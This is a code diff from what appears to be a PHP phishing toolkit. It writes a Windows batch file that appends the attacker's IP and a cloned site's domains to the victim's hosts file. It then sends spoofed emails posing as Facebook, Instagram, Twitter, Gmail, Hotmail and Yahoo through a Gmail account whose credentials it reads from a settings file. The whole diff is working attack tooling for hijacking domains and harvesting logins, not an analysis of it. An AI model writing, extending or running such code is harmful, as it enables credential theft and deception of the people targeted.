@@ -193,11 +193,14 @@ transform: scale(2);
              {
               $operating_system_path =  "C:\Windows\System32\drivers";
               }
+
  
               if (isset($_SESSION['site_hack']))             
                 {
+
             $ipv4 = trim(shell_exec('shell/./my_ipv4.sh'));
             $PublicIP = trim(shell_exec("shell/./my_public_ip.sh")); 
+
               // Get network type for attack
               if ($network == "Lan")
                {
@@ -207,6 +210,8 @@ transform: scale(2);
                  {
                   $MyIP = $PublicIP;
                    }
+
+
             $dns = '"' .$_SESSION['site_hack'] .'"';
             $dns_0 = str_replace ("https","http",$dns);
             $dns_1 = str_replace ("https://","",$dns);
@@ -240,15 +245,23 @@ transform: scale(2);
                     .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_7, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                     .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_8, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                     .PHP_EOL .'exit'; 
+
             fwrite($hosts, $lines_hosts);
             fclose($hosts);
+
            chmod("/var/www/proxior/export/l_win.bat", 0777);
+
               } // end of isset session site hack
+
+
+
           if (isset($_SESSION['site_ready']))
               {
+
             $ipv4 = trim(shell_exec('shell/./my_ipv4.sh'));
             $publicIP = trim(shell_exec("shell/./my_public_ip.sh")); 
               // Get network type for attack
+
               if ($network == "Lan")
                {
                 $MyIP = $ipv4;
@@ -296,31 +309,26 @@ transform: scale(2);
         chmod("/var/www/proxior/export/l_win.bat", 0777);
             
              } // end of isset session site_ready
+
   //echo "<script type='text/javascript'>alert('Fake dns for $fake_dns generated');
        //  </script>";
+
           echo ("<script>location.href='/'</script>");
+
          } 
  
        } // end of submit dns
  
+
+
+
      // for sumbit email phishing
      if (isset($_POST['submit_email_phishing']))
          {
  
-       // $email_net =  $obj_dns-> SAFE_DATA_ENTER($_POST['email_net']);
         $email     =  $obj_dns-> SAFE_DATA_ENTER($_POST['email']);
         $ngrok     =  $obj_dns-> SAFE_DATA_ENTER($_POST['ngrok']);
-        //$ipv4_mail = trim(shell_exec('shell/./my_ipv4.sh'));
-       // $PublicIP_mail = trim(shell_exec("shell/./my_public_ip.sh")); 
-              // Get network type for attack
-              //if ($email_net == "Lan")
-              // {
-               // $MyIP_mail = $ipv4_mail;
-               //  }
-            // else  if ($email_net == "Wan")
-               //  {
-               //   $MyIP_mail = $PublicIP_mail;
-                //   }
+
                // Get clone site name from send link to email 
         
 
@@ -344,6 +352,25 @@ transform: scale(2);
                    }
 
 
+  // Get email account details for login mail and send
+  // Using one gmail for this attack method
+
+
+    $handle = @fopen('settings.txt', "r");
+
+    if ($handle) 
+       { 
+        while (!feof($handle)) { 
+        $lines[] = fgets($handle, 4096); 
+        } 
+       fclose($handle); 
+       } 
+
+      $username_of_mail = $lines[0];
+      $password_of_mail = $lines[1];
+
+
+
  if ($link == 'no-reply@facebook_pc.com')
         {
           $link = str_replace(".com_pc","",$str_link2);
@@ -358,8 +385,8 @@ $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
 $mail->Host = "smtp.gmail.com";
 $mail->Port = 465; // or 587
 $mail->IsHTML(true);
-$mail->Username = "";
-$mail->Password = "";
+$mail->Username = $username_of_mail;
+$mail->Password = $password_of_mail;
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/fb.png', 'fb');
@@ -393,6 +420,7 @@ $mail->AddAddress("$email");
       } // end if site ready facebook pc
  
 
+
 else if ($link == 'no-reply@facebook_tablet_mobile.com')
         {
           $link = str_replace(".com_tablet_mobile","",$str_link2);
@@ -407,8 +435,8 @@ $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
 $mail->Host = "smtp.gmail.com";
 $mail->Port = 465; // or 587
 $mail->IsHTML(true);
-$mail->Username = "";
-$mail->Password = "";
+$mail->Username = $username_of_mail;
+$mail->Password = $passworde_of_mail;
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/fb.png', 'fb');
@@ -455,8 +483,8 @@ $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
 $mail->Host = "smtp.gmail.com";
 $mail->Port = 465; // or 587
 $mail->IsHTML(true);
-$mail->Username = "";
-$mail->Password = "";
+$mail->Username = $username_of_mail;
+$mail->Password = $password_of_mail;
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/inst.png', 'inst');
@@ -503,8 +531,8 @@ $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
 $mail->Host = "smtp.gmail.com";
 $mail->Port = 465; // or 587
 $mail->IsHTML(true);
-$mail->Username = "";
-$mail->Password = "";
+$mail->Username = $username_of_mail;
+$mail->Password = $password_of_mail;
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/twitt.png', 'twitt');
@@ -551,8 +579,8 @@ $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
 $mail->Host = "smtp.gmail.com";
 $mail->Port = 465; // or 587
 $mail->IsHTML(true);
-$mail->Username = "";
-$mail->Password = "";
+$mail->Username = $username_of_mail;
+$mail->Password = $password_of_mail;
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/gm.png', 'gm');
@@ -602,8 +630,8 @@ $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
 $mail->Host = "smtp.gmail.com";
 $mail->Port = 465; // or 587
 $mail->IsHTML(true);
-$mail->Username = "";
-$mail->Password = "";
+$mail->Username = $username_of_mail;
+$mail->Password = $password_of_mail;
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/hotm.png', 'hotm');
@@ -650,8 +678,8 @@ $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
 $mail->Host = "smtp.gmail.com";
 $mail->Port = 465; // or 587
 $mail->IsHTML(true);
-$mail->Username = "";
-$mail->Password = "";
+$mail->Username = $username_of_mail;
+$mail->Password = $password_of_mail;
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/yah.png', 'yah');
@@ -698,8 +726,8 @@ $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
 $mail->Host = "smtp.gmail.com";
 $mail->Port = 465; // or 587
 $mail->IsHTML(true);
-$mail->Username = "";
-$mail->Password = "";
+$mail->Username = $username_of_mail;
+$mail->Password = $password_of_mail;
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/any.png', 'any');
